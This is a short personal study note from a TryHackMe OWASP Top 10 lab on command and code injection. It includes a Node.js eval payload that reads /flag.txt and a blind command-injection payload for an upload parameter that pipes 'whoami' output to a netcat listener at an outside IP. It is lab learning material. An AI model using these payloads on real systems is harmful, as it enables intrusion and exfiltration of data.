
2024-06-01 15:27

Source: #tryhackme #owasp2021 #web 

Tags: [[owasp]]  [[SQL injection]]

#### Injection attacks were ranked No. 3 on OWASP Top 10 2021

Command injection -  occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly.
- take advantage of a bash feature called "inline commands" to abuse
- Bash allows you to run commands within commands
To execute inline commands, you only need to enclose them in the following format `$(your_command_here)`
### Injecting JS code to get flag.txt 

```js
eval(`(function() { return ${ formula } ;}())`)
```
what should i input in place of formula to get flag.txt? -
```js
require('fs').readFileSync('/flag.txt').toString();
```

> [!tip]
> Try injecting code in every field that can be manipulated 

### Blind Command Injection via file upload 

The webapp allows you to upload a file and lets you select a parameter while uploading 
the burp request shows the contents of the file and the parameter selected 
we try injecting code in the txt file we upload but it doesn't execute 
We then try injecting in the parameter field.

below is the payload used in the parameter field, Because this is blind command injection we can't see the o/p so we grep nc with the payload
```sh
bytebuster ; whoami | nc 10.17.117.61 4444; 
```

`;` are real important 
open a [[netcat]] listener on another terminal 

### References
[TryHackMe | OWASP Top 10 - 2021](https://tryhackme.com/r/room/owasptop102021)